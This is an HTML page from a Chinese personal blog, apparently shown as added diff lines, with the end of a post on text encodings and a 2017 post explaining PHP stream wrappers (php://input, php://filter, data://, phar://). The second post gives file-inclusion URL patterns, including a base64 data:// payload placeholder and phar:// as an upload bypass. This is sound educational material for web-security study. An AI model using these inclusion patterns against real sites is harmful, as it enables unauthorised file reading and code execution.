+<h3 id="x"><a href="#x" class="headerlink" title="/x??"></a>/x??</h3><p>十六进制编码，对应的其实是ascii码，写成这样是为了避免不必要的截断。在python当中使用正则表达式匹配，转化为十进制值，在使用<code>chr</code>即可。</p>
+<h3 id="XXencode-UUencode"><a href="#XXencode-UUencode" class="headerlink" title="XXencode/UUencode"></a>XXencode/UUencode</h3><p>这两个编码原理都是一样的，以三个字节作为分组，共24bit，24bit分为四组，每组6bit，对应0～63中某个值。两者的区别在于这64个值的对应表不一样。UUencode对应关系为<code>＋32</code>的ascii码，XXencode自行谷歌。</p>
+<h3 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h3><p>url编码又叫百分号编码，是统一资源定位(URL)编码方式。URL地址（常说网址）规定了常用地数字，字母可以直接使用，另外一批作为特殊用户字符也可以直接用（/,:@等），剩下的其它所有字符必须通过%xx编码处理。原理其实就是ascii对应的hex前面加上％。<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">import urllib<span class="selector-class">.parse</span></div><div class="line">code=<span class="string">',)$DD'</span></div><div class="line">code2url=urllib<span class="selector-class">.parse</span><span class="selector-class">.quote</span>(code)</div><div class="line">url2code=urllib<span class="selector-class">.parse</span><span class="selector-class">.unquote</span>(code2url)</div></pre></td></tr></table></figure></p>
+<p>至于中文的url编码问题，不具体展开，有兴趣请移步<a href="http://leowzy.iteye.com/blog/794464" target="_blank" rel="external">这里</a></p>
+<h3 id="Unicode编码"><a href="#Unicode编码" class="headerlink" title="Unicode编码"></a>Unicode编码</h3><p>python当中所有原始字符串都是由unicode字符组成的，我们看到的比如utf-8，其实都是这些unicode字符encode而来的。在python当中,unicode字符的格式为<code>\u????</code>。因此，当遇到一些非python的unicode字符格式时，可以通过正则提取然后在加以转换。<br>由于这在python当中处理有一定困难，可用<a href="http://www.mxcz.net/tools/Unicode.aspx" target="_blank" rel="external">在线工具</a>替代。</p>
+<h3 id="HTML编码"><a href="#HTML编码" class="headerlink" title="HTML编码"></a>HTML编码</h3><p>HTML对某些特殊符号会进行<a href="http://www.w3school.com.cn/tags/html_ref_entities.html" target="_blank" rel="external">编码</a>。<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">import <span class="selector-tag">html</span><span class="selector-class">.parser</span></div><div class="line">h2t=<span class="selector-tag">html</span><span class="selector-class">.parser</span><span class="selector-class">.unescape</span>(<span class="string">"&amp;quot;"</span>)<span class="comment">//"</span></div></pre></td></tr></table></figure></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://dinfinite.cn/2017/04/24/浅谈PHP伪协议/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="D_infinite">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="D_infinite的小站">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/04/24/浅谈PHP伪协议/" itemprop="url">浅谈PHP伪协议</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-04-24T11:39:45+08:00">
+                2017-04-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PHP/" itemprop="url" rel="index">
+                    <span itemprop="name">PHP</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="0x01-介绍"><a href="#0x01-介绍" class="headerlink" title="0x01 介绍"></a>0x01 介绍</h3><p>这里引用官网的解释</p>
+<blockquote>
+<p> PHP 带有很多内置 URL 风格的封装协议，可用于类似 fopen()、 copy()、 file_exists() 和 filesize() 的文件系统函数。 除了这些封装协议，还能通过 stream_wrapper_register() 来注册自定义的封装协议。</p>
+</blockquote>
+<p>而对于<code>php://</code>，官网的解释如下</p>
+<blockquote>
+<p> PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p>
+</blockquote>
+<h3 id="0x02-功能"><a href="#0x02-功能" class="headerlink" title="0x02 功能"></a>0x02 功能</h3><p><code>php://</code>主要支持以下几种类型协议</p>
+<h4 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h4><blockquote>
+<p> php://input 是个可以访问请求的原始数据的只读流。 POST 请求的情况下，最好使用 php://input 来代替  $HTTP_RAW_POST_DATA，因为它不依赖于特定的 php.ini 指令。 而且，这样的情况下 $HTTP_RAW_POST_DATA 默认没有填充， 比激活 always_populate_raw_post_data 潜在需要更少的内存。 enctype=”multipart/form-data” 的时候 php://input 是无效的。</p>
+</blockquote>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line">$ok=$_POST[<span class="string">'ok'</span>];</div><div class="line">$ok2=$_POST[<span class="string">'ok2'</span>];</div><div class="line">$test=readfile(<span class="string">'php://input'</span>,<span class="string">'r'</span>);<span class="comment">//ok=1&amp;ok2=2</span></div></pre></td></tr></table></figure>
+<h4 id="php-output"><a href="#php-output" class="headerlink" title="php://output"></a>php://output</h4><blockquote>
+<p>php://output 是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区。</p>
+</blockquote>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line"><span class="keyword">echo</span> <span class="string">'ok'</span>;</div><div class="line">$test=readfile(<span class="string">'php://output'</span>,<span class="string">'r'</span>);<span class="comment">//ok</span></div></pre></td></tr></table></figure>
+<h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h4><blockquote>
+<p>php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。</p>
+</blockquote>
+<p>一般来讲，resource是链接，但是通过<code>read</code>参数，可以读取文这里不需要开启allow_url_include参数也可以读取远程链接或文件。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line">$test=readfile(<span class="string">'php://filter/read=convert.base64-encode/resource=3'</span>,<span class="string">'r'</span>);</div></pre></td></tr></table></figure>
+<p>此时，能输出文件3的base64编码。</p>
+<h3 id="0x03-除了PHP-之外"><a href="#0x03-除了PHP-之外" class="headerlink" title="0x03 除了PHP://之外"></a>0x03 除了PHP://之外</h3><h4 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h4><blockquote>
+<p>data://伪协议 &gt;&gt; 数据流封装器，和php://相似都是利用了流的概念，将原本的include的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，通过你输入payload来实现目的；</p>
+</blockquote>
+<p>用法：<br><figure class="highlight delphi"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?<span class="keyword">file</span>=data:<span class="comment">//text/plain;base64,base64编码的payload</span></div></pre></td></tr></table></figure></p>
+<p>效果跟php://input是一样的，只不过不需要将数据放到post当中，直接在url输入即可。</p>
+<h4 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h4><blockquote>
+<p>phar://伪协议 &gt;&gt; 数据流包装器，自 PHP 5.3.0 起开始有效，正好契合上面两个伪协议的利用条件。说通俗点就是php解压缩包的一个函数，解压的压缩包与后缀无关。</p>
+</blockquote>
+<p>用法：<br><figure class="highlight delphi"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?<span class="keyword">file</span>=phar:<span class="comment">//压缩包/内部文件</span></div></pre></td></tr></table></figure></p>
+<p>只能解压phar以及zip后缀,rar不行。通常用于上传绕过。</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+  </section>
+
+  
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
+  </nav>
+
+
+
+          </div>
+          
+
+
+          
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">D_infinite</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">19</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">分类</span>
+                
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">D_infinite</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
